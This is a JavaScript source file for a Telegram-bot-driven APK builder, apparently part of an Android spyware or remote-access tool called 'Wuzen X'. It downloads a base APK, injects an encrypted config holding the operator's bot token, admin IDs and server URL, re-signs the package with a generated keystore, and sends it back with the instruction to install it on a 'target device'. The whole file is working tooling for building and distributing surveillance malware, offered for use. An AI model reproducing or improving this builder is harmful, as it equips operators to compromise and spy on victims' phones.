import fs from 'fs';
import path from 'path';
import { execSync } from 'child_process';
import crypto from 'crypto';
import axios from 'axios';
import os from 'os';
import AdmZip from 'adm-zip';
import config from './config.js';

const BUILD_DIR = path.join(os.tmpdir(), 'wuzenx-build-' + Date.now());
const KEYSTORE_PATH = path.join(BUILD_DIR, 'keystore.jks');
const CONFIG_ENCRYPTED = path.join(BUILD_DIR, 'config.enc');
const PATCHED_APK = path.join(BUILD_DIR, 'patched.apk');
const SIGNED_APK = path.join(BUILD_DIR, 'signed.apk');
const DEBUG = process.env.DEBUG === '1';

function hasTool(tool) {
  try { execSync(`command -v ${tool}`); return true; } catch { return false; }
}

function freeDiskMb() {
  try {
    const out = execSync('df -k /tmp').toString().trim().split('\n').pop().split(/\s+/);
    return Math.floor(parseInt(out[3], 10) / 1024);
  } catch { return -1; }
}

function escHtml(s = '') {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function run(cmd, opts = {}) {
  return execSync(cmd, { stdio: ['pipe', 'pipe', 'pipe'], timeout: opts.timeout || 60000 }).toString();
}

export class ApkBuilder {
  constructor(bot) {
    this.bot = bot;
    this.builds = new Map();
  }

  async build(botToken, chatId, adminId, channelId, keystorePass, keyAlias, options = {}) {
    const buildId = Date.now().toString();
    this.builds.set(chatId, { status: 'starting', progress: 0, buildId, log: [] });
    let stage = 'init';

    const log = (msg) => {
      const line = `[${new Date().toISOString()}] ${stage}: ${msg}`;
      console.log(line);
      const s = this.builds.get(chatId);
      if (s) (s.log = s.log || []).push(line);
    };

    const fail = async (error) => {
      const s = this.builds.get(chatId);
      if (s) { s.status = 'failed'; s.error = error.message; }

      const diag =
        `❌ <b>Build Failed — stage: <code>${escHtml(stage)}</code></b>\n\n` +
        `<code>${escHtml(error.message)}</code>\n\n` +
        `🔍 <b>Diagnostics:</b>\n` +
        `- BUILD_DIR exists: ${fs.existsSync(BUILD_DIR)}\n` +
        `- Free space /tmp: ${freeDiskMb()} MB\n` +
        `- BASE_APK_URL set: ${config.BASE_APK_URL ? 'yes' : '❌ NO'}\n` +
        `- java: ${hasTool('java') ? '✅' : '❌'} | keytool: ${hasTool('keytool') ? '✅' : '❌'}\n` +
        `- apksigner: ${hasTool('apksigner') ? '✅' : '❌'} | jarsigner: ${hasTool('jarsigner') ? '✅' : '❌'}\n` +
        `- zip: ${hasTool('zip') ? '✅' : '❌'} | zipalign: ${hasTool('zipalign') ? '✅' : '❌'}`;

      log(`FAILED: ${error.message}`);
      try {
        await this.bot.telegram.sendMessage(chatId, diag, { parse_mode: 'HTML' });
      } catch (e) {
        console.error('Failed to send failure message:', e.message);
      }
      setTimeout(() => this.cleanup(BUILD_DIR), 30000);
    };

    try {
      // ===== 1. PREFLIGHT =====
      stage = 'preflight';
      fs.mkdirSync(BUILD_DIR, { recursive: true });
      log('Preflight checks...');

      if (!hasTool('java')) throw new Error('Missing Java runtime. Deploy with the Dockerfile — openjdk-17 is included.');
      if (!config.KEYSTORE_BASE64 && !hasTool('keytool')) throw new Error('Missing keytool. Deploy with the Dockerfile (openjdk provides it).');
      if (!hasTool('apksigner') && !hasTool('jarsigner')) throw new Error('No APK signer found. The Dockerfile installs apksigner via Android build-tools.');
      if (!config.BASE_APK_URL && !(options.localBaseApk && fs.existsSync(options.localBaseApk))) {
        throw new Error('No base APK source. Set BASE_APK_URL env var to a direct .apk URL.');
      }

      const disk = freeDiskMb();
      if (disk >= 0 && disk < 300) throw new Error(`Low disk space: ${disk} MB free in /tmp (need ≥ 300 MB)`);
      log(`Preflight OK — disk: ${disk} MB, apksigner: ${hasTool('apksigner')}`);
      await this.sendProgress(chatId, '🔄 <b>Initializing build environment…</b>', 5);

      // ===== 2. ACQUIRE BASE APK =====
      stage = 'download';
      const baseApkSource = options.baseApkUrl || config.BASE_APK_URL;
      const baseApkPath = path.join(BUILD_DIR, 'base.apk');

      if (options.localBaseApk && fs.existsSync(options.localBaseApk)) {
        fs.copyFileSync(options.localBaseApk, baseApkPath);
        log('Base APK copied from local source');
        await this.sendProgress(chatId, '📦 <b>Base APK loaded from local source</b>', 20);
      } else {
        await this.sendProgress(chatId, '⬇️ <b>Downloading base APK…</b>', 15);
        const response = await axios({ method: 'GET', url: baseApkSource, responseType: 'stream', timeout: 120000 });
        if (DEBUG) log(`HTTP ${response.status}, content-length: ${response.headers['content-length'] || 'unknown'}`);
        if (response.status !== 200) throw new Error(`Download failed: HTTP ${response.status}`);

        const writer = fs.createWriteStream(baseApkPath);
        response.data.pipe(writer);
        await new Promise((res, rej) => { writer.on('finish', res); writer.on('error', rej); });
        log(`Download finished — ${(fs.statSync(baseApkPath).size / 1048576).toFixed(2)} MB`);
        await this.sendProgress(chatId, '✅ <b>Base APK downloaded</b>', 20);
      }

      if (!fs.existsSync(baseApkPath)) throw new Error('Base APK missing after download');
      const stats = fs.statSync(baseApkPath);
      if (stats.size < 100000) throw new Error(`Base APK too small (${stats.size} bytes) — likely an HTML page, not an APK. Check BASE_APK_URL.`);
      await this.sendProgress(chatId, `✅ <b>Base APK verified</b> (${(stats.size / 1048576).toFixed(2)} MB)`, 25);

      // ===== 3. ENCRYPT CONFIG =====
      stage = 'config';
      await this.sendProgress(chatId, '🔐 <b>Creating encrypted configuration…</b>', 30);
      this.createConfigEnc(botToken, adminId, channelId, options);
      log('config.enc created');
      await this.sendProgress(chatId, '✅ <b>Config encrypted</b>', 40);

      // ===== 4. INJECT config.enc =====
      stage = 'inject';
      fs.copyFileSync(baseApkPath, PATCHED_APK);
      await this.sendProgress(chatId, '💉 <b>Injecting configuration into APK…</b>', 55);

      let injected = false;
      if (hasTool('zip')) {
        try {
          run(`zip -u "${PATCHED_APK}" "${CONFIG_ENCRYPTED}"`, { timeout: 30000 });
          injected = true;
          log('Injected with zip -u (preserves all original entries)');
        } catch (e) { log(`zip -u failed: ${e.message.split('\n')[0]}`); }
      }
      if (!injected) {
        const zip = new AdmZip(PATCHED_APK);
        zip.addFile('config.enc', fs.readFileSync(CONFIG_ENCRYPTED), '', AdmZip.COMPRESSION_STORED);
        zip.writeZip(PATCHED_APK);
        injected = true;
        log('Injected with adm-zip (pure JS fallback)');
      }
      await this.sendProgress(chatId, '✅ <b>Configuration injected</b>', 65);

      // verify the entry exists
      let verified = false;
      try {
        const check = run(`unzip -l "${PATCHED_APK}" config.enc`, { timeout: 10000 });
        verified = check.includes('config.enc');
      } catch { verified = !!new AdmZip(PATCHED_APK).getEntry('config.enc'); }
      if (!verified) throw new Error('config.enc not found in APK after injection');
      log('Injection verified');
      await this.sendProgress(chatId, '✅ <b>Config injection verified</b>', 70);

      // ===== 5. ZIPALIGN (optional, fixes install issues on modern Android) =====
      stage = 'zipalign';
      if (hasTool('zipalign')) {
        try {
          run(`zipalign -f -p 4 "${PATCHED_APK}" "${PATCHED_APK}.aligned"`, { timeout: 30000 });
          fs.renameSync(`${PATCHED_APK}.aligned`, PATCHED_APK);
          log('zipalign done');
          await this.sendProgress(chatId, '✅ <b>APK optimized (zipaligned)</b>', 75);
        } catch (e) {
          log(`zipalign skipped: ${e.message.split('\n')[0]}`);
          await this.sendProgress(chatId, '⚠️ <b>Zipalign skipped (optional)</b>', 75);
        }
      } else {
        await this.sendProgress(chatId, '⚠️ <b>Zipalign skipped (optional)</b>', 75);
      }

      // ===== 6. SIGN =====
      stage = 'sign';
      await this.sendProgress(chatId, '✍️ <b>Signing APK…</b>', 80);
      await this.createKeystore(keystorePass, keyAlias);

      if (hasTool('apksigner')) {
        run(`apksigner sign --ks "${KEYSTORE_PATH}" --ks-pass pass:${keystorePass} --key-pass pass:${keystorePass} --ks-key-alias ${keyAlias} --out "${SIGNED_APK}" "${PATCHED_APK}"`, { timeout: 90000 });
        log('Signed with apksigner (v1 + v2 — installs on all Android versions)');
      } else {
        run(`jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "${KEYSTORE_PATH}" -storepass ${keystorePass} -keypass ${keystorePass} "${PATCHED_APK}" ${keyAlias}`, { timeout: 90000 });
        fs.copyFileSync(PATCHED_APK, SIGNED_APK);
        log('Signed with jarsigner (v1 only — installs only on targetSdk ≤ 29 devices)');
      }
      await this.sendProgress(chatId, '✅ <b>APK signed successfully</b>', 90);

      // ===== 7. VERIFY SIGNATURE =====
      stage = 'verify';
      if (hasTool('apksigner')) {
        try {
          const certs = run(`apksigner verify --print-certs "${SIGNED_APK}"`, { timeout: 15000 });
          const sha = certs.split('\n').find((l) => l.includes('SHA-256'))?.trim() || '?';
          log('Signature verified: ' + sha);
        } catch (e) {
          throw new Error('Signature verification failed: ' + e.message);
        }
      }
      await this.sendProgress(chatId, '✅ <b>Signature verified</b>', 92);

      // ===== 8. DELIVER =====
      stage = 'deliver';
      await this.sendProgress(chatId, '📤 <b>Uploading APK to Telegram…</b>', 95);
      const apkSize = fs.statSync(SIGNED_APK).size;
      const apkReadStream = fs.createReadStream(SIGNED_APK);

      await this.bot.telegram.sendDocument(
        chatId,
        { source: apkReadStream, filename: 'WuzenX_v20.apk' },
        {
          caption: `🔥 <b>Wuzen X v20.0</b> 🔥\n\n✅ Build Complete\n📦 Size: ${(apkSize / 1048576).toFixed(2)} MB\n🆔 Build: <code>${buildId}</code>\n\n⚠️ Send this APK to your target device.`,
          parse_mode: 'HTML'
        }
      );
      log('APK delivered to Telegram');
      await this.sendProgress(chatId, '✅ <b>Build Complete!</b>', 100);

      setTimeout(() => this.cleanup(BUILD_DIR), 5 * 60 * 1000);
      this.builds.set(chatId, { status: 'complete', progress: 100, buildId, log: this.builds.get(chatId)?.log || [] });

    } catch (error) {
      console.error('Build error:', error);
      await fail(error);
    }
  }

  createConfigEnc(botToken, adminId, channelId, options) {
    const configData = {
      bot_token: botToken,
      admin_ids: Array.isArray(adminId) ? adminId : [parseInt(adminId)],
      channel_id: channelId,
      server_url: options.serverUrl || config.SERVER_URL,
      timestamp: Date.now(),
      version: '20.0'
    };

    const encryptionKey = crypto.createHash('sha256')
      .update(config.ENCRYPTION_KEY || 'WuzenX2026DefaultKey!@#$%^&*()')
      .digest();
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', encryptionKey, iv);

    let encrypted = cipher.update(JSON.stringify(configData), 'utf8', 'hex');
    encrypted += cipher.final('hex');

    fs.writeFileSync(CONFIG_ENCRYPTED, iv.toString('hex') + ':' + encrypted, 'utf8');
  }

  async createKeystore(keystorePass, keyAlias) {
    if (config.KEYSTORE_BASE64) {
      fs.writeFileSync(KEYSTORE_PATH, Buffer.from(config.KEYSTORE_BASE64, 'base64'));
      return;
    }
    run(`keytool -genkey -v -keystore "${KEYSTORE_PATH}" -alias ${keyAlias} -keyalg RSA -keysize 2048 -validity 10000 -storepass ${keystorePass} -keypass ${keystorePass} -dname "CN=WuzenX, OU=Dev, O=WuzenX, L=NA, ST=NA, C=US"`, { timeout: 30000 });
  }

  async sendProgress(chatId, message, progress) {
    try {
      const status = this.builds.get(chatId);
      if (status) { status.progress = progress; status.lastMessage = message; }
      const barLength = 20;
      const filledLength = Math.floor((progress * barLength) / 100);
      const bar = '█'.repeat(filledLength) + '░'.repeat(barLength - filledLength);
      await this.bot.telegram.sendMessage(chatId,
        `🔧 <b>Building Wuzen X v20.0…</b>\n\n<code>${bar} ${progress}%</code>\n\n${message}`,
        { parse_mode: 'HTML' }
      );
    } catch (err) {
      console.error('Progress send error:', err);
    }
  }

  cleanup(dirPath) {
    try {
      if (fs.existsSync(dirPath)) fs.rmSync(dirPath, { recursive: true, force: true });
    } catch (err) {
      console.error('Cleanup error:', err);
    }
  }

  getBuildStatus(chatId) {
    return this.builds.get(chatId) || null;
  }

  getBuildLog(chatId) {
    return this.builds.get(chatId)?.log || [];
  }
}

export default ApkBuilder;
